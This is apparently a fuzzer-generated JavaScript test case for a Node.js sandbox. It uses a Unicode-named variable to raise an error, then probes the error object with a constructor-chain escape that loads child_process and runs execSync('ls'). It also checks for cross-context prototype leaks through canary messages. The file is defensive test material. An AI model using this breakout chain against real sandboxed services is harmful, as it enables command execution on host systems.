try {
    var _ࣰࣱࣲࣦࣩ࣭࣮࣯ࣶࣹࣺࣤࣥࣧࣨ࣪࣫࣬ࣳࣴࣵࣷࣸࣻࣼࣽࣾ឴឵᮫ᮬᮭᳳ᳴ꙴꙵꙶꙷꙸꙹꙺꙻꚟꫫꫬꫭꫮꫯꫵ꫶𑃰𑃱𑃲𑃳𑃴𑃵𑃶𑃷𑃸𑃹𑄀𑄁𑄂𑄧𑄨𑄩𑄪𑄫𑄬𑄭𑄮𑄯𑄰𑄱𑄲𑄳𑄴𑄶𑄷𑄸𑄹𑄺𑄻𑄼𑄽𑄾𑄿𑆀𑆁𑆂𑆳𑆴𑆵𑆶𑆷𑆸𑆹𑆺𑆻𑆼𑆽𑆾𑆿𑇀𑇐𑇑𑇒𑇓𑇔𑇕𑇖𑇗𑇘𑇙𑚫𑚬𑚭𑚮𑚯𑚰𑚱𑚲𑚳𑚴𑚵𑚷𑚶𑛀𑛁𑛂𑛃𑛄𑛅𑛆𑛇𑛈𑛉𖽑𖽒𖽓𖽔𖽕𖽖𖽗𖽘𖽙𖽚𖽛𖽜𖽝𖽞𖽟𖽠𖽡𖽢𖽣𖽤𖽥𖽦𖽧𖽨𖽩𖽪𖽫𖽬𖽭𖽮𖽯𖽰𖽱𖽲𖽳𖽴𖽵𖽶𖽷𖽸𖽹𖽺𖽻𖽼𖽽𖽾𖾏𖾐𖾑𖾒;
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}